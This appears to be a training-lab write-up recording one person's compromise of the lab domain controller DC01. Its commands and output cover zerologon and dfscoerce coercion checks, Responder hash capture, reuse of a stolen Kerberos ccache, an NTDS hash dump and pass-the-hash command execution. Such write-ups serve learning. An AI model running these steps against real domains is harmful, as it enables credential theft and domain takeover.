5. Gain access to the DC01 and submit the contents of the flag located in `C:\Users\Administrator\Desktop\flag.txt`.

```sh
# Reminder
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX' --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache          READ,WRITE      Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share


# Who is he?
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u XXXXXX -p 'XXXXXX' -M groupmembership -o USER=XXXXXX

...
GROUPMEM... 172.16.15.3     389    DC01             [+] User: XXXXXX is member of following groups: 
GROUPMEM... 172.16.15.3     389    DC01             Domain Users


# Let's scan the environment. Check if DC is vulnerable to zerologon
sudo proxychains -q crackmapexec smb 172.16.15.3 -M zerologon

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
ZEROLOGON   172.16.15.3     445    DC01             Attack failed. Target is probably patched.


# Petit Potam
sudo proxychains -q crackmapexec smb 172.16.15.3 -M petitpotam


# Nope. NoPac?
sudo proxychains -q crackmapexec smb 172.16.15.3  -u XXXXXX -p 'XXXXXX' -M nopac

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
NOPAC       172.16.15.3     445    DC01             TGT with PAC size 1615
NOPAC       172.16.15.3     445    DC01             TGT without PAC size 1615


# Nope. dfscoerce?
 sudo proxychains -q crackmapexec smb 172.16.15.3  -u XXXXXX -p 'XXXXXX' -M dfscoerce
 
 
SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
NetrDfsRemoveStdRoot 
ServerName:                      '127.0.0.1\x00' 
RootShare:                       'test\x00' 
ApiFlags:                        1 


DFSCOERCE   172.16.15.3     445    DC01             VULNERABLE
DFSCOERCE   172.16.15.3     445    DC01             Next step: https://github.com/Wh04m1001/DFSCoerce


# Finally, something. Open the github link and ask for options
sudo proxychains -q crackmapexec smb 172.16.15.3  -u XXXXXX -p 'XXXXXX' -M dfscoerce --options

[*] dfscoerce module options:
LISTENER    Listener Address (defaults to 127.0.0.1)


# So, responder? Start it 
sudo responder -I tun0

...
[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.3]
    Responder IPv6             [dead:beef:2::1001]
    Challenge set              [random]
    Don\'t Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-3TAOIJUO6MW]
    Responder Domain Name      [DLIG.LOCAL]
    Responder DCE-RPC Port     [46579]

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.



# Send
sudo proxychains -q crackmapexec smb 172.16.15.3  -u XXXXXX -p 'XXXXXX' -M dfscoerce -o LISTENER=10.10.14.3

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
NetrDfsRemoveStdRoot 
ServerName:                      '10.10.14.3\x00' 
RootShare:                       'test\x00' 
ApiFlags:                        1 


DFSCOERCE   172.16.15.3     445    DC01             VULNERABLE
DFSCOERCE   172.16.15.3     445    DC01             Next step: https://github.com/Wh04m1001/DFSCoerce


# Nope. Do I need to download the payload?
git clone -q https://github.com/Wh04m1001/DFSCoerce
cd DFSCoerce

# Run
sudo proxychains python3 dfscoerce.py -u XXXXXX -p 'XXXXXX' -d dc01.inlanefreight.htb 10.10.14.3

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
usage: dfscoerce.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH] [-no-pass] [-k] [-dc-ip ip address] [-target-ip ip address]
                    listener target
dfscoerce.py: error: the following arguments are required: target


# After multiple tinkering
sudo proxychains python3 dfscoerce.py -u XXXXXX -p 'XXXXXX' -d inlanefreight.htb -dc-ip 172.16.15.3 target 172.16.15.3

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[-] Connecting to ncacn_np:172.16.15.3[\PIPE\netdfs]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.15.3:445  ...  OK
[+] Successfully bound!
[-] Sending NetrDfsRemoveStdRoot!
NetrDfsRemoveStdRoot 
ServerName:                      'target\x00' 
RootShare:                       'test\x00' 
ApiFlags:                        1 


rpc_s_access_denied


# Try again
sudo proxychains -q python3 dfscoerce.py -u XXXXXX -p 'XXXXXX' -d inlanefreight.htb -dc-ip 172.16.15.3  172.16.15.3 10.10.14.3

[-] Connecting to ncacn_np:10.10.14.3[\PIPE\netdfs]
Something went wrong, check error status => SMB SessionError: code: 0xc000035c - STATUS_NETWORK_SESSION_EXPIRED - The client session has expired; so the client must re-authenticate to continue accessing the remote resources.


# Try responder
sudo responder -I tun0


# Then send again
sudo proxychains -q python3 dfscoerce.py -u XXXXXX -p 'XXXXXX' -d inlanefreight.htb -dc-ip 172.16.15.3  172.16.15.3 10.10.14.3

[-] Connecting to ncacn_np:10.10.14.3[\PIPE\netdfs]
Something went wrong, check error status => SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


# We should see this on responder
[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.129.204.182
[SMB] NTLMv2-SSP Username : inlanefreight.htb\XXXXXX
[SMB] NTLMv2-SSP Hash     : XXXXXX::inlanefreight.htb:64f08d57d0a700cf:813EC35FF092584FE39C6CB527132D39:01010000000000...0000000000


# Ok. So, nothing new. And maybe none of the vulns work. Go back to enum
sudo proxychains -q crackmapexec smb 172.16.15.3  -u XXXXXX -p 'XXXXXX' -M gpp_autologin

sudo proxychains -q crackmapexec smb 172.16.15.3  -u XXXXXX -p 'XXXXXX' -M gpp_password


# What ACLs does he have on the domain?
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb  -u XXXXXX -p 'XXXXXX' -M daclread -o TARGET=XXXXXX ACTION=read RIGHTS=DCSync

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.15.3     389    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
DACLREAD    172.16.15.3     389    DC01             Be careful, this module cannot read the DACLS recursively.
DACLREAD    172.16.15.3     389    DC01             Target principal found in LDAP (CN=XXXXXX,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)


# Ccache?
sudo proxychains -q impacket-getTGT inlanefreight.htb/XXXXXX:'XXXXXX' -dc-ip 172.16.15.3

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)


# Kerberos authentication?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX' --kerberos --shares
SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache          READ,WRITE      Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Did I check that Ccache share?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX' -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
...
[+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/172.16.15.3.json".
[*] SMB Shares:           9 (ADMIN$, C$, Ccache, CertEnroll, DEV, DEV_INTERN, IPC$, NETLOGON, SYSVOL)
[*] SMB Readable Shares:  5 (Ccache, CertEnroll, IPC$, NETLOGON, SYSVOL)
[*] SMB Writable Shares:  1 (Ccache)
[*] SMB Filtered Shares:  1
[*] Total folders found:  16
[*] Total files found:    11
[*] File size average:    1.12 KB
[*] File size min:        22 B
[*] File size max:        4.53 KB

# Read the file
cat /tmp/nxc_hosted/nxc_spider_plus/172.16.15.3.json 

{
    "Ccache": {
        "flag.txt": {
            "atime_epoch": "2022-12-15 13:56:47",
            "ctime_epoch": "2022-12-15 13:56:32",
            "mtime_epoch": "2022-12-15 13:56:47",
            "size": "27 B"
        },
        "XXXXXX@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches": {
            "atime_epoch": "2026-03-01 20:26:40",
            "ctime_epoch": "2022-12-15 13:57:48",
            "mtime_epoch": "2026-03-01 20:26:38",
            "size": "1.45 KB"
        }
    },
...


# The whole time, the ccache file was there. Download the file
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX' --share Ccache --get-file         "XXXXXX@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches" XXXXXX.ccache

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX
SMB         172.16.15.3     445    DC01             [*] Copying "XXXXXX@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches" to "XXXXXX.ccache"
SMB         172.16.15.3     445    DC01             [+] File "XXXXXX@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches" was downloaded to "XXXXXX.ccache"


# We have a ccache. Export
export KRB5CCNAME=$(pwd)/XXXXXX.ccache


# Check if if works use ccache File as Kerberos Authentication Method
sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 


# YEEEEEEEESSSSSS!!!! Shares?
sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 
SMB         172.16.15.3     445    DC01             [-] Error getting user: list index out of range
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Local-auth?
sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache --shares --local-auth

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [-] DC01\ from ccache KDC_ERR_WRONG_REALM 
SMB         172.16.15.3     445    DC01             [-] Error getting user: list index out of range
SMB         172.16.15.3     445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED


# Which groups?
sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache --groups

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 
SMB         172.16.15.3     445    DC01             [-] Error enumerating domain group using dc ip 172.16.15.3: SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.


# Try ldap protocol?
sudo proxychains -q crackmapexec ldap 172.16.15.3 --use-kcache --groups
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb --use-kcache --groups

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.15.3     389    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 
LDAP        172.16.15.3     389    DC01             Administrators
LDAP        172.16.15.3     389    DC01             Users
LDAP        172.16.15.3     389    DC01             Guests
...


# So, looks like we can't run commands on smb but on ldap. LAPS?
sudo proxychains -q crackmapexec ldap 172.16.15.3 --use-kcache -M laps

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.15.3     389    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 
LAPS        172.16.15.3     389    DC01             [*] Getting LAPS Passwords
LAPS        172.16.15.3     389    DC01             [-] No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !


# gmsa?
sudo proxychains -q crackmapexec ldap 172.16.15.3 --use-kcache --gmsa

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAPS       172.16.15.3     636    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 
LDAPS       172.16.15.3     636    DC01             [*] Getting GMSA Passwords
LDAPS       172.16.15.3     636    DC01             Account: XXXXXX$          NTLM: 


# So, he clearly has some permissions on ldap. How do I dump the secrets? Who is this user to begin with? Get ldap modules
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb --use-kcache -L

LOW PRIVILEGE MODULES
[*] adcs                      Find PKI Enrollment Services in Active Directory and Certificate Templates Names
[*] daclread                  Read and backup the Discretionary Access Control List of objects. Be careful, this module cannot read the DACLS recursively, see more explanation in the options.
[*] enum_trusts               Extract all Trust Relationships, Trusting Direction, and Trust Transitivity
[*] find-computer             Finds computers in the domain via the provided text
[*] get-desc-users            Get description of the users. May contained password
[*] get-network               Query all DNS records with the corresponding IP from the domain.
[*] get-unixUserPassword      Get unixUserPassword attribute from all users in ldap
[*] get-userPassword          Get userPassword attribute from all users in ldap
[*] group-mem                 Retrieves all the members within a Group
[*] groupmembership           Query the groups to which a user belongs.
[*] laps                      Retrieves all LAPS passwords which the account has read permissions for.
[*] ldap-checker              Checks whether LDAP signing and binding are required and / or enforced
[*] maq                       Retrieves the MachineAccountQuota domain-level attribute
[*] obsolete                  Extract all obsolete operating systems from LDAP
[*] pso                       Module to get the Fine Grained Password Policy/PSOs
[*] subnets                   Retrieves the different Sites and Subnets of an Active Directory
[*] user-desc                 Get user descriptions stored in Active Directory
[*] whoami                    Get details of provided user

HIGH PRIVILEGE MODULES (requires admin privs)


# Who is the user?
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb --use-kcache -M whoami

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.15.3     389    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 
WHOAMI      172.16.15.3     389    DC01             distinguishedName: CN=XXXXXX,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
WHOAMI      172.16.15.3     389    DC01         name: XXXXXX
WHOAMI      172.16.15.3     389    DC01         Enabled: Yes
WHOAMI      172.16.15.3     389    DC01         Password Never Expires: Yes
WHOAMI      172.16.15.3     389    DC01         Last logon: 134168949975880428
WHOAMI      172.16.15.3     389    DC01         pwdLastSet: 133149965366662703
WHOAMI      172.16.15.3     389    DC01         logonCount: 7501
WHOAMI      172.16.15.3     389    DC01         sAMAccountName: XXXXXX


# Was really stuck here for a minute. Or more like 3 hours. Until I asked gemini
sudo proxychains -q crackmapexec smb dc01.inlanefreight.htb -k --ntds


# Adapt
sudo proxychains -q crackmapexec smb dc01.inlanefreight.htb --use-kcache -k --ntds
sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache -k --ntds

[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         dc01.inlanefreight.htb 445    DC01             [+] INLANEFREIGHT.LOCAL\svc_inlaneadm from ccache 
SMB         dc01.inlanefreight.htb 445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         dc01.inlanefreight.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.inlanefreight.htb 445    DC01             INLANEFREIGHT.LOCAL\Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXX:::
SMB         dc01.inlanefreight.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc01.inlanefreight.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:629f9f346735b45965d635f89b47e90f:::
SMB         dc01.inlanefreight.htb 445    DC01             INLANEFREIGHT.LOCAL\avazquez:1718:aad3b435b51404eeaad3b435b51404ee:ca0f0d81a9065381798924a01656accb:::
...
SMB         dc01.inlanefreight.htb 445    DC01             DEV01$:4647:aad3b435b51404eeaad3b435b51404ee:8d4df1b71ed30c41bfc06823006fae0d:::
SMB         dc01.inlanefreight.htb 445    DC01             [+] Dumped 3435 NTDS hashes to /root/.nxc/logs/DC01_dc01.inlanefreight.htb_2026-03-01_222307.ntds of which 2931 were added to the database
SMB         dc01.inlanefreight.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc01.inlanefreight.htb 445    DC01             [*] cat /root/.nxc/logs/DC01_dc01.inlanefreight.htb_2026-03-01_222307.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc01.inlanefreight.htb 445    DC01             [*] grep -iv disabled /root/.nxc/logs/DC01_dc01.inlanefreight.htb_2026-03-01_222307.ntds | cut -d ':' -f1


# It makes no sense for me why this works and not the other one I have been running using like
sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache -k --sam
SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 


# Or this
sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache --ntds

[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX from ccache 
SMB         172.16.15.3     445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         172.16.15.3     445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.15.3     445    DC01             INLANEFREIGHT.LOCAL\Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXX:::
SMB         172.16.15.3     445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.15.3     445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:629f9f346735b45965d635f89b47e90f:::


# That FAILED earlier. And now it's working? F!Y!!!!! Anyways. Validate
sudo proxychains -q crackmapexec smb 172.16.15.3 -u Administrator -H XXXXXX 

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Administrator:XXXXXX (Pwn3d!)


# Get the flag
sudo proxychains -q crackmapexec smb 172.16.15.3 -u Administrator -H XXXXXX  -x "type C:\Users\Administrator\Desktop\flag.txt"

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Administrator:XXXXXX (Pwn3d!)
SMB         172.16.15.3     445    DC01             [+] Executed command via wmiexec
SMB         172.16.15.3     445    DC01             XXXXXX
```



# Reflections

It (only-LOL) took 3 days to complete. I have been at this since Friday, 02/27/2026. Today is 03/01/2026. I could have completed earlier had I gotten all the AD intricacies in the brain. But that's why we do this right? To get better.
Good to know that I can attack the domain remotely. It will be my preferred way of doing things.

What next?
